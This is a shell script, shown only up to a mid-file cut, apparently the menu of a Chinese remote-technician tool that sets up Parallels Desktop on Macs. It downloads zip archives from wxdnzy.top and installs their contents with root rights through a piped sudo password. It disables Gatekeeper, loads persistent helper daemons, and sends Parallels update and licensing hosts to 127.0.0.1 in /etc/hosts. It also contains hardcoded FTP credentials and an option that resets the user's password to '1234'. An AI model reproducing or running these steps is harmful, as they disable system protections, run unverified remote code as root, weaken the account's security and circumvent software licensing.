#!/bin/sh
Start_menu(){
zxc="/abcdefghijklmnobqrstuvwszp.:-!x"
cxz="1234567890.@"
dkzdqx="1"
if [ -f /Volumes/JGDow/如何右击.png ]; then	
ycmmaz="1"
fi
#wsp="$"
#pws="echo ""$wsp"pass" | sudo -S sudo"
rm -f /tmp/8954.sh >/dev/null 2>&1
rm -f /tmp/8954.zip >/dev/null 2>&1	

mkdir -p ~/Downloads/JG_Download >/dev/null 2>&1
echo 尊重作者劳动成果，破解则全家不得好死！>/tmp/8954.sh
chmod a+x /tmp/8954.sh >/dev/null 2>&1
gzexe /tmp/8954.sh >/dev/null 2>&1
rm -rf /tmp/8954.sh~ >/dev/null 2>&1


sjdir="23606"

modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
modelcpu="$(sysctl machdep.cpu.brand_string 2>/dev/null|awk '/machdep.cpu.brand_string:/ {print $2,$3,$4,$5,$6,$7,$8,$9}')"

M1CPU=$(echo "$modelcpu" | grep "Apple")
if [ ! "$M1CPU" ]; then
M1CPU=$(echo "$modelcpu" | grep "M1")
fi
if [ ! "$M1CPU" ]; then
M1CPU=$(echo "$modelcpu" | grep "M2")
fi
if [ "$M1CPU" ]; then
M1CPU="M1"
fi

clear && printf "\e[3J"
if [ ! "$ftpm" ]; then
echo
echo  "\033[36m正在连接服务器中.\033[0m"
echo
pdxl=$(curl --connect-timeout 3 http://wxdnzy.top/yz/yz.txt 2>/dev/null)
if [[ $pdxl != "ABCDEFG" ]]; then
pdxll=$(curl --connect-timeout 3 http://wxdnzy.top/yz/yz.txt 2>/dev/null)
if [[ $pdxll != "ABCDEFG" ]]; then
pdxlll=$(curl --connect-timeout 3 http://wxdnzy.top/yz/yz.txt 2>/dev/null)
if [[ $pdxlll != "ABCDEFG" ]]; then
clear && printf "\e[3J"
echo
echo
echo
echo  "\033[36m服务器均无法链接，请使用M方案！\033[0m"
echo
echo
echo       "\033[36m可以重新打开重试！！！\033[0m"
echo
zjxx="M"
if [ ! "$hkos" ]; then
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
else
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
fi
if [ "$ycmmaz" ]; then
clear && printf "\e[3J"
echo	
echo
echo
echo  "\033[36m服务器均无法链接，请通知技术员！！！\033[0m"	
echo
echo
echo
exit
fi
read -s -n1 -p " "
else
if [ ! "$hkos" ]; then
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
else
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
fi
ip8="http://wxdnzy.top/ip8"
ipd="http://wxdnzy.top/ipd"
ftpip="mac.zps.icu"
ftpm="mac1:147369258"
#ftpd="1"
zjxx="③"
hkip="1"
fi
else
if [ ! "$hkos" ]; then
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
else
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
fi
ip8="http://wxdnzy.top/ip8"
ipd="http://101.91.152.128:3322/?id="
ftpip="mac.zps.icu"
ftpm="mac2:147369258"
zjxx="②"
hkip=""
fi
else
if [ ! "$hkos" ]; then
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
else
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
fi
ip5="http://wxdnzy.top/ip5"
ip8="http://wxdnzy.top/ip8"
ipd="http://wxdnzy.top/ipd"
ftpip="mac.zps.icu"
ftpm="mac3:147369258"
zjxx="①"
hkip=""
fi
fi

if [[ $modelxh = "10.4"* ]]; then
oldvn="1"
oldvnn="1"
dkpm="1"
fi

if [[ $modelxh = "10.5"* ]]; then
oldvn="1"
oldvnn="1"
dkpm="1"
fi

if [[ $modelxh = "10.6"* ]]; then
oldvn="1"
oldvnn="1"
dkpm="1"
fi

if [[ $modelxh = "10.7"* ]]; then
oldvn="1"
dkpm="1"
fi

if [[ $modelxh = "10.8"* ]]; then
oldvn="1"
dkpm="1"
fi

if [[ $modelxh = "10.9"* ]]; then
oldvn="1"
dkpm="1"
fi

if [[ $modelxh = "10.10"* ]]; then
oldvn="1"
dkpm="1"
fi

if [[ $modelxh = "10.11"* ]]; then
oldvn="1"
dkpm="1"
fi

if [[ $modelxh = "10.12"* ]]; then
oldvn="1"
dkpm="1"
fi

if [[ $modelxh = "10.13"* ]]; then
oldvn="1"
dkpm="1"
fi

if [[ $modelxh = "13."* ]]; then
dkzdqx="1"
zxos="1"
fi

if [[ $modelxh = "14."* ]]; then
dkzdqx="1"
zxos="1"
fi

if [ "$ycmmaz" ]; then
#pws=""
kaishi
fi

clear && printf "\e[3J"
jbjm=""
unset name
unset url
unset CustomizeURL
if [ ! "$ksdk" ]; then
killall "Disk Utility" >/dev/null 2>&1
ksdk="1"
fi
#mrjt=$(curl --connect-timeout 3 https://saying.api.azwcl.com/saying/get 2>/dev/null)
#mrjtm=$(echo $mrjt | awk -F 'author":"|",' '{print $2}')
#mrjt=$(echo $mrjt | awk -F 'content":"|"}}' '{print $2}')


mrjt=$(curl --connect-timeout 3 https://v1.jinrishici.com/all.json 2>/dev/null)
mrjt=$(echo $mrjt | awk -F '"content" : "|",' '{print $2}')

if [ -f /tmp/Windows.wim ]; then
if [ -f ~/Downloads/JG_Download/b2d23fec595fb342151f56da6a049aa8 ]; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/1809.dmg
fi
if [ -f ~/Downloads/JG_Download/78edbe456d012774391922bd0d033062 ]; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/1909.dmg
fi
if [ -f ~/Downloads/JG_Download/cb2ffd3aed1fed9ef3d7003be0a43fdc ]; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/Win11.dmg
fi
if [ -f ~/Downloads/JG_Download/01ae5481387e4ee4491d15c6e0e0a806 ]; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/Win8.dmg
fi
fi

if [ -f /tmp/boot.img.gz ]; then
if [ -f ~/Downloads/JG_Download/6cb5729b3d505da8036e2d754dadb4ad ]; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/7x64.dmg
fi
if [ -f ~/Downloads/JG_Download/5f3c340bfe4c0e825d38ed289238d045 ]; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/1809_HDD.dmg
fi
if [ -f ~/Downloads/JG_Download/2c2af9b269bfb72f7caecf2808a4a9b4 ]; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/1909_HDD.dmg
fi
if [ -f ~/Downloads/JG_Download/0a6df24c17c2662238bc3ccd60d5396a ]; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/Win11_HDD.dmg
fi
if [ -f ~/Downloads/JG_Download/923ea7e26cee67c0fb927706396ca502 ]; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/Win8_HDD.dmg
fi
if [ -f ~/Downloads/JG_Download/8ff6d415ea398a25efb1636ae33f2b4d ]; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/7x32.dmg
fi
fi

TVID=$(cat /private/var/log/system.log | grep TeamViewerIDTracker)
TVID=${TVID##* }

if [ ! "$TVID" ]; then
if [ -f /Library/Application\ Support/TeamViewer/rolloutfile.tv13 ]; then
TVID=$(cat /Library/Application\ Support/TeamViewer/rolloutfile.tv13)
TVID=${TVID%,*,*}
fi
fi

TVName=$(uname -n)
disk_total="$(df -h | head -2 | tail -1 | awk '{print $2}' | sed 's/i/B/g')[总]"
disk_used="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/i/B/g')[可用]"
Disk="$disk_used / $disk_total"
if [ -f /Library/PreferencePanes/Tuxera\ NTFS.prefPane/Contents/Resources/TuxeraNTFSForMac.icns ]; then
NTFS="TuxeraNTFS"
fi
if [ -f /Library/PreferencePanes/ParagonNTFS.prefPane/Contents/Resources/FSPrefPane.icns ]; then
NTFS2="ParagonNTFS"
fi
Date=$(date +"%Y-%m-%d-%A")	
if [ ! "$csh" ]; then
osascript <<EOD
tell application "System Events"
tell process "Terminal"
set frontmost to true
end tell
end tell
tell application "Terminal"
set font size of first window to "14"
end tell
EOD
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
if [ $? -eq 1 ] ; then
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
fi
csh="1"
fi
osascript <<EOD
tell application "Terminal"
activate
set size of window 1 to {800, 650}
end tell
EOD
if [ -e $HOME/Parallels ]; then	
if [ -f $HOME/Desktop/*.lnk ]; then
SCLNK="1"
fi	
fi

if [ -f ~/dcba.sh ] ; then
source ~/dcba.sh
if [[ $modelxh != "10.6"* ]]; then
tbid=$(echo $tbid | base64 -D)
fi
if [ ! "$tbid" ]; then
rm -rf ~/dcba.sh
fi
fi

#open /System/Library/CoreServices/Applications/About\ This\ Mac.app >/dev/null 2>&1
if [ ! -f ~/dcba.sh ] ; then
clear && printf "\e[3J"
echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo
echo
read -p "输入ID：" tbid
if [ ! "$tbid" ]; then
Start_menu
fi
if [ "$tbid" = "4" ]; then
Start_menu
fi
if [ "$tbid" = "8" ]; then
Start_menu
fi
if [ "$tbid" = "666" ]; then
Start_menu
fi
if [ "$tbid" = *linbox.lanzou* ]; then
Start_menu
fi
if [ "$tbid" = *m6z.cn* ]; then
Start_menu
fi
echo "#!/bin/sh" > ~/dcba.sh
if [[ $modelxh != "10.6"* ]]; then
echo tbid=$(echo $tbid | base64) >> ~/dcba.sh
else
echo tbid=$(echo $tbid) >> ~/dcba.sh
fi
chflags hidden ~/dcba.sh
fi
Battery=$(ioreg -c AppleSmartBattery -r | awk '$1~/Capacity/{c[$1]=$3} END{OFMT="%.2f%"; max=c["\"MaxCapacity\""]; if (max>0) { print 100*c["\"CurrentCapacity\""]/max;} }')
batterystatus=$(pmset -g batt | sed -n '2p' | awk '{print $4}' | sed 's/;//g')
if [[ $batterystatus == discharging ]] ; then 
  batterystatus="未充电"
elif [[ $batterystatus == charging ]] ; then 
  batterystatus="充电中"
else 
  batterystatus="充电完成"
fi


if [ ! "$oldusb" ]; then
if [[ $modelxh = "10.10"* ]]; then
oldusb="1"
#open /System/Library/PreferencePanes/EnergySaver.prefPane
fi
if [[ $modelxh = "10.9"* ]]; then
oldusb="1"
#open /System/Library/PreferencePanes/EnergySaver.prefPane
fi
if [[ $modelxh = "10.8"* ]]; then
oldusb="1"
#open /System/Library/PreferencePanes/EnergySaver.prefPane
fi
if [[ $modelxh = "10.7"* ]]; then
oldusb="1"
olddsik="1"
#open /System/Library/PreferencePanes/EnergySaver.prefPane
fi
if [[ $modelxh = "10.6"* ]]; then
oldmm="1"
oldusb="1"
olddsik="1"
#open /System/Library/PreferencePanes/EnergySaver.prefPane
fi
if [[ $modelxh = "10.5"* ]]; then
oldmm="1"
oldusb="1"
olddsik="1"
fi
if [[ $modelxh = "10.4"* ]]; then
oldmm="1"
oldusb="1"
olddsik="1"
fi
fi
Time2022=$(echo "$Date" | grep "2024")
if [ ! "$Time2022" ]; then
	clear && printf "\e[3J"
	killall "System Preferences" 2>/dev/null
	echo	
	echo
	echo
    read -s -n1 -p "检查到电脑时间非【2024】年"
    echo
open /System/Library/PreferencePanes/DateAndTime.prefPane
fi
umount -f /Volumes/JGDow 2>/dev/null
diskutil eject $(diskutil list | grep 'JGDow' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g') >/dev/null 2>&1
clear && printf "\e[3J"
if [ "$oldusb" ]; then
Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
else
Hostname=$(diskutil list | grep external)
fi
apfsfq=$(diskutil list | grep Apple_APFS)
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
#echo "$mrjtm": "\033[36m${mrjt}\033[0m"
echo "\033[36m${mrjt}\033[0m"
echo
echo
echo "    __________________________ \033[36m极光-下载器\033[0m _________________________"
echo "   |                          ------------                          |"
#echo "   |   [Z] 工具组件总线路 【"$zjxx"】                                    |"
#echo "   |                                                                |"
echo "   |   [1] 打开下载位置             $zjxx                               |"
echo "   |                                                                |"
echo "   |   [x] 退出                                                     |"
echo "   |                                                                |"
echo "   |___________________________________________________${sjdir}________|"
echo
echo 当前日期：      ${Date}   "$M1CPU"
echo NTFS软件：     "\033[36m${NTFS} ${NTFS2}\033[0m"
echo 外置 U盘：     "\033[36m${Hostname}\033[0m"
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
if [ "$Battery" ]; then
echo 剩余电量： "${Battery}%  / ${batterystatus}"
fi
echo "磁盘空间：${Disk}" 
echo
echo
echo
echo
echo
echo
echo
read -s -p "_______请等待技术员操作:" num
case "$num" in
	666)
	Customize
	;;
	xf)
	clear && printf "\e[3J"
	echo
	echo
	echo 
	read -s -n1 -p "正在修复中...请勿操作..."
	echo
	echo
	echo
	exit
	;;
	w)
	dscl . passwd $HOME "" 1234
	Start_menu
	;;
	1)
	open ~/Downloads/JG_Download
	Start_menu
	;;
	z)
    Start_menu
	;;
	2)
	rm -f /tmp/aria2c

	if [[ $modelxh = "10.9"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$osip/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	
else

	if [[ $modelxh = "10.8"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$osip/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
		
else

	if [[ $modelxh = "10.7"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$osip/aria2c75.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1

else

	if [[ $modelxh = "10.6"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$osip/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else

	if [[ $modelxh = "10.5"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$osip/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else

	if [[ $modelxh = "10.4"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$osip/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else
	if [ ! -f "/tmp/aria2c" ]; 
	then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$osip/aria2ccc.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	fi
	fi
	fi
	fi
	fi
	fi
	fi
		
		if [ -f "/tmp/aria2c" ]; then
	    chmod a+x /tmp/aria2c
		read -s -n1 -p "Aria2c下载支持已经成功，任意键返回... "
		else
		read -s -n1 -p "无法下载，请重试！"
		fi
	Start_menu
	;;
	4)
	Virtual
	;;
	5)
	killall "Disk Utility"
	open /System/Applications/Utilities/Disk\ Utility.app 	
    open /Applications/Utilities/Disk\ Utility.app
	Start_menu
	;;
	7)  
    password="root"
    rm -rf ~/abcd.sh
    rm -rf ~/dcba.sh
    Start_menu
    ;;
    6)
    killall "Boot Camp Assistant"
	open /System/Applications/Utilities/Boot\ Camp\ Assistant.app
    open /Applications/Utilities/Boot\ Camp\ Assistant.app
    Start_menu
	;;
	8)  
	Customize
    ;;
    m)  
    tzms="1"
	Customize
    ;;
    g)  
	zldqq="1"
	AZPKG
    ;;
	x)
	clear && printf "\e[3J"
	exit 1
	;;
	0)
	clear && printf "\e[3J"
	#read -s -n1 -p "此电脑无法安装，原因未知！！！"
	exit 1
	;;
	*)
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "输入错误！请输入正确的选项！请按任意键返回重新输入... "
	Start_menu
	;;
esac
}


M1Arm(){
clear && printf "\e[3J"
#killall Dock

if [ "$azqdq" ]; then
echo "$pass" | sudo -S sudo spctl --master-disable >/dev/null 2>&1
	killall PD\ Runner 2>/dev/null
	killall PD\ Partner 2>/dev/null
	killall PD_START 2>/dev/null
	echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1
    curl -# -C - --connect-timeout 10 -o /tmp/PDTun.zip "$osip/PDTun.zip"
	unzip -o "/tmp/PDTun.zip" -d "/Applications">/dev/null 2>&1
	if [ ! -e /Applications/启动Win系统.app ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/PDTun.zip "$ip5/PDTun.zip"
	unzip -o "/tmp/PDTun.zip" -d "/Applications">/dev/null 2>&1  	
   	fi
   	echo "$pass" | sudo -S sudo mkdir -p /Library/LaunchDaemons
   	echo "$pass" | sudo -S sudo mkdir -p /Library/PrivilegedHelperTools
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Library/LaunchServices/com.lihaoyun6.PD-Runner-Helper /Library/PrivilegedHelperTools/
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Resources/com.lihaoyun6.PD-Runner-Helper.plist /Library/LaunchDaemons/
   	echo "$pass" | sudo -S sudo chmod 600 /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist
   	echo "$pass" | sudo -S sudo launchctl load /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist
   	echo "$pass" | sudo -S sudo launchctl enable system/com.lihaoyun6.PD-Runner-Helper
   	defaults write com.lihaoyun6.PD-Runner PDST 0
   	defaults write com.lihaoyun6.PD-Runner disableUpdate 1
   	zhendock=$(defaults read com.apple.dock | grep %E5%90%AF%E5%8A%A8Win%E7%B3%BB%E7%BB%9F.app)
    if [ ! "$zhendock" ]; then
   	defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/启动Win系统.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
	open /Applications/启动Win系统.app
	clear && printf "\e[3J"
    exit 0
    fi

if [ "$azqdq2" ]; then
echo "$pass" | sudo -S sudo spctl --master-disable >/dev/null 2>&1
	killall PD\ Runner 2>/dev/null
	killall PD\ Partner 2>/dev/null
	killall PD_START 2>/dev/null
	echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1
	#curl -# -C - --connect-timeout 10 -o /tmp/PD18QX.zip "$osip/PD18QX.zip"
	#unzip -o "/tmp/PD18QX.zip" -d "/Applications">/dev/null 2>&1
	#open /Applications/启动Win系统.app
	#read -t 3
	#killall applet
	#osascript -e 'quit app"Parallels Desktop"'
	#echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
    curl -# -C - --connect-timeout 10 -o /tmp/PDrun2.zip "$osip/PDrun2.zip"
	unzip -o "/tmp/PDrun2.zip" -d "/Applications">/dev/null 2>&1
	if [ ! -e /Applications/启动Win系统.app ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/PDrun2.zip "$ip5/PDrun2.zip"
	unzip -o "/tmp/PDrun2.zip" -d "/Applications">/dev/null 2>&1  	
   	fi
   	echo "$pass" | sudo -S sudo mkdir -p /Library/LaunchDaemons
   	echo "$pass" | sudo -S sudo mkdir -p /Library/PrivilegedHelperTools
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Library/LaunchServices/com.lihaoyun6.PD-Runner-Helper /Library/PrivilegedHelperTools/
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Library/LaunchServices/com.lihaoyun6.PD-Runner-Helper.plist /Library/LaunchDaemons/
   	echo "$pass" | sudo -S sudo chmod 600 /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist
   	echo "$pass" | sudo -S sudo launchctl load /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist
   	echo "$pass" | sudo -S sudo launchctl enable system/com.lihaoyun6.PD-Runner-Helper
   	defaults write com.lihaoyun6.PD-Runner AppleLanguages '("en")'
   	defaults write com.lihaoyun6.PD-Runner PDST 1
   	defaults write com.lihaoyun6.PD-Runner disableUpdate 1
   	defaults write com.lihaoyun6.PD-Runner runAtLogin 1
   	zhendock=$(defaults read com.apple.dock | grep %E5%90%AF%E5%8A%A8Win%E7%B3%BB%E7%BB%9F.app)
    if [ ! "$zhendock" ]; then
   	defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/启动Win系统.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
	open /Applications/启动Win系统.app
	clear && printf "\e[3J"
    exit 0
    fi

if [ "$azqdq3" ]; then
echo "$pass" | sudo -S sudo spctl --master-disable >/dev/null 2>&1
	killall PD\ Runner 2>/dev/null
	killall PD\ Partner 2>/dev/null
	killall PD_START 2>/dev/null
	echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1
    curl -# -C - --connect-timeout 10 -o /tmp/PDST.zip "$osip/PDST.zip"
	unzip -o "/tmp/PDST.zip" -d "/Applications">/dev/null 2>&1
	if [ ! -e /Applications/PDST.app ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/PDST.zip "$ip5/PDST.zip"
	unzip -o "/tmp/PDST.zip" -d "/Applications">/dev/null 2>&1  	
   	fi
   	sed -i ".bak" 's/1234/'$pass'/g' /Applications/PDST.app/Contents/Resources/config.json
   	zhendock=$(defaults read com.apple.dock | grep PDST.app)
    if [ ! "$zhendock" ]; then
   	defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/PDST.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
	open /Applications/PDST.app
	clear && printf "\e[3J"
    exit 0
    fi

osascript -e 'quit app"Parallels Desktop"'
osascript -e 'quit app"VMware Fusion"'

	if [ "$pd18sq" ]; then
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-18.0.1-53056.dmg ]; then
    clear
	echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
	echo 正在安装虚拟机软件，请等待....
    hdiutil attach ~/Downloads/JG_Download/ParallelsDesktop-18.0.1-53056.dmg>/dev/null 2>&1
    killall PD\ Runner 2>/dev/null
	killall PD\ Partner 2>/dev/null
	killall PD_START 2>/dev/null
	killall prl_client_app >/dev/null 2>&1 	
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/启动Win系统.app" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD Runner.app'" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD Partner.app'" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/Go.app" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/PDST.app" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD 启动.app'" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/启动虚拟机.app" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Parallels Desktop.app'" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/打开Win10.prlnk" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/打开Win11.prlnk" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Windows 10.app'" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Windows 7.app'" password "$pass" with administrator privileges
EOD
    else
	echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1	
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ 启动.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动虚拟机.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win10.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win11.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 10.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 7.app >/dev/null 2>&1
	fi
	echo
	echo 正在下载必要组件，请等待....
	curl -# -C - --connect-timeout 10 -o /tmp/pd18sq.zip --retry 8888 "$ip5/pd18sq.zip"
    unzip -o "/tmp/pd18sq.zip" -d "/tmp">/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep www.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	if [ "$moderoot" ]; then
osascript <<EOD
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.cn" then
